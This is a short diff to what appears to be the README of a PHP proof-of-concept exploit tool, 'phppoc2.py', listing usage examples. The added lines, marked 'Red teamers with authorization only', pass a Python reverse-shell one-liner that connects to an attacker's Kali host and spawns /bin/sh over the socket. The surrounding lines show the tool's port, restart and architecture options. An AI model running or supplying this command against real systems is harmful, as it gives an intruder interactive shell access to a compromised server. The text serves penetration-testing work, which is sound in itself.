@@ -206,6 +206,9 @@ python3 phppoc2.py --port 18110 --restart p2s-pure-18110
 
 # Specify architecture (auto-detected by default)
 python3 phppoc2.py --port 18110 --arch aarch64
+
+# Red teamers with authorization only:
+python3 phppoc2.py --port <whatever you have, 80 for example> --cmd 'python3 -c "import os,pty,socket;s=socket.socket();s.connect((\"<your kali ip>\",<whatever kali port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")"'
 ```
 
 **Options:**
